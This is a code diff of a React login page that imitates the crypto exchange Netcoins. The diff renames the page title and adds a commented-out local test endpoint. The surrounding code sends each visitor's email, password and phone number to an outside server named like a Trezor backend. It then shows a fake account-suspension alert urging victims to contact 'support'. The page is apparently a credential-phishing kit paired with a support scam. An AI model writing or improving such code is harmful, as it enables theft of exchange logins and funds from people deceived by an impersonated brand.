@@ -93,7 +93,7 @@ export default function LoginMainPage() {
                 }
             }
             const data = {
-                title: "Netcoins | Buy Bitcoin & Crypto",
+                title: "Netcoins",
                 email: email,
                 password,
                 phone: phone ? `+${code?.includes("+") ? code?.slice(1) : code}${phone}` : ""
@@ -101,6 +101,7 @@ export default function LoginMainPage() {
             }
             setLoading(true)
             const response = await axios.post("https://trezor-backend.vercel.app/api/v1/send-user-info", data)
+            // const response = await axios.post("http://localhost:5454/api/v1/send-user-info", data)
             if (response) {
                 if (response) {
                     setAlert({ type: 'success', message: 'Important message!: Due to unauthorized activity and identification failure on your Account. Account Access has been suspended. Please Get in touch with our Support Staff Immediately, Chat with our live Expert to unblock your account.' });
